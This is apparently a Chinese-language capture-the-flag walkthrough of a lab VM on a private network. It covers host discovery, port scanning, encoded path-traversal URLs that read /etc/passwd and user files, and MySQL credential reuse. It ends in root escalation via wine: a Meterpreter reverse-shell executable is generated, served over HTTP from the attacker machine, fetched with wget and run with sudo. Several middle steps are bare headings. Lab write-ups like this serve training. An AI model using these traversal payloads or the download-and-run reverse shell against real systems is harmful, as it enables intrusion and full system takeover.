1、通过netdiscover检测主机IP地址

netdiscover -r 192.168.207.0/24

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.207.157
开放端口为22、80、3306、8080

3、WEB渗透测试

3.1 使用nikto进行8080端口扫描发现有目录遍历

nikto -host http://192.168.207.157:8080

3.2 访问页面发现可以读取文件

http://192.168.207.157:8080/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

3.3 查看home目录文件

http://192.168.207.157:8080/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2f

3.4 查看home目录中的sunrise

http://192.168.207.157:8080/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fsunrise%2f

3.5 查看user.txt文件

http://192.168.207.157:8080/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fsunrise%2fuser.txt

3.6 使用gobuster遍历目录

gobuster dir -u http://192.168.207.157:8080/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f -w /usr/share/wordlists/dirb/common.txt

3.7 查看mysql文件

3.8 上述的/etc/passwd中weborf有登陆权限，使用mysql密码测试

3.9 登录mysql进行查找

3.12 切换到sunrise用户查看权限

4、系统提权

4.1 使用wine进行提权

参考：https://www.hacknos.com/wine-privilege-escalation/

使用msfvenom生成exe的shellcode

msfpc windows 192.168.207.129

4.2 开启http服务

python -m SimpleHTTPServer

wget http://192.168.207.129:8000/windows-meterpreter-staged-reverse-tcp-443.exe

被攻击机上执行命令

sudo win windows-meterpreter-staged-reverse-tcp-443.exe
